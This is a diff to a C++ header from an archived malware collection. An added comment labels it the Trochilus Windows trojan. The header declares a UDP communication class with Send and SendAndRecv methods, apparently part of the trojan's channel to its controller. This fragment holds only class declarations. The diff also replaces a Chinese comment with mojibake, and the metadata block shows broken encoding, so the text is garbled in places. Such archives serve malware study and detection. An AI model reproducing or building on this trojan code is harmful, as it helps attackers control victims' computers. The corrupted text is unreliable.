@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 #include "IComm.h"
 #include <Winsock2.h>
@@ -38,7 +49,7 @@ private:
 	_vtcp_bind m_vbind;
 
 public:
-	//ÊµÏÖIComm½Ó¿Ú
+	//Êµï¿½ï¿½ICommï¿½Ó¿ï¿½
 	virtual COMM_NAME GetName() {return COMMNAME_UDP; };
 	virtual BOOL Send( ULONG targetIP, const LPBYTE pData, DWORD dwSize );
 	virtual BOOL SendAndRecv( ULONG targetIP, const LPBYTE pSendData, DWORD dwSendSize, LPBYTE* pRecvData, DWORD& dwRecvSize );
